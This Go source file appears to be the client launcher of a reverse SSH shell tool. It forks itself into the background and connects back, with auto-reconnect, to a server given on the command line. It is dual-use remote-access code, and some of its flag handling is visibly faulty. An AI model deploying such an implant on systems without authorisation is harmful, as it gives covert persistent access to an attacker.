package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func printHelp() {

	fmt.Println("usage: ", filepath.Base(os.Args[0]), "[--foreground] [--fingerprint] destination")
	fmt.Println("\t\t--foreground\tCauses the client to run without forking to background")
	fmt.Println("\t\t--fingerprint\tServer public key SHA256 hex fingerprint for auth")
}

func main() {

	flag.Bool("foreground", false, "Dont fork to background on start")
	flag.Bool("reconnect", true, "Auto reconnect on disconnection")
	fingerprint := *flag.String("fingerprint", "", "Server public key fingerprint")

	flag.Usage = printHelp

	flag.Parse()

	var fg, rc bool

	flag.Visit(func(f *flag.Flag) {
		switch f.Name {
		case "reconnect":
			rc = true
		case "foreground":
			fg = true
		}
	})

	if len(flag.Args()) != 1 {
		fmt.Println("Missing destination")
		printHelp()
		return
	}

	if fg {
		client.Run(flag.Args()[0], fingerprint, rc)
	}

	cmd := exec.Command(os.Args[0], append([]string{"--foreground"}, os.Args[1:]...)...)
	cmd.Start()
	log.Println("Ending parent")

}
